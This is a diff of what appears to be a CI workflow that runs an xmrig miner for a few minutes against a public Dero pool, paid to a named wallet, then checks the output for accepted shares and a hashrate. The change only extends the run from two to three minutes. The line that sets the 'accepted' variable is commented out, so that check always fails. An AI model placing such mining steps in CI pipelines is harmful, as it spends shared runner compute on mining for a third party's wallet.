@@ -42,14 +42,13 @@ jobs:
         cd ${{github.workspace}}/build/binaries/
         sudo chmod +x ./xmrigMiner
         CONFIG=' -o us.dero.herominers.com:1117 -u dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000 --tls -k --coin dero -a astrobwt --pause-on-battery --astrobwt-avx2 --astrobwt-max-size=250 --print-time=10 --daemonized --no-color'
-        # run for 120 seconds and output to file, capturing timeout error
-        timeout 2m ./xmrigMiner $CONFIG 2>&1 | tee output.txt
+        # run for 3 min and output to file, capturing timeout error
+        timeout 3m ./xmrigMiner $CONFIG 2>&1 | tee output.txt
         # fail if no "accepted" line found
         # accepted=`grep "accepted" output.txt`
         if [[ -z "$accepted" ]]; then
           echo "No 'accepted' line found" && exit 1
         fi
-
         # and what is our hashrate?
         hashrate=`grep "max" output.txt | tail -1` && hashrate=${hashrate##*max}
         if [[ -z "$hashrate" ]]; then
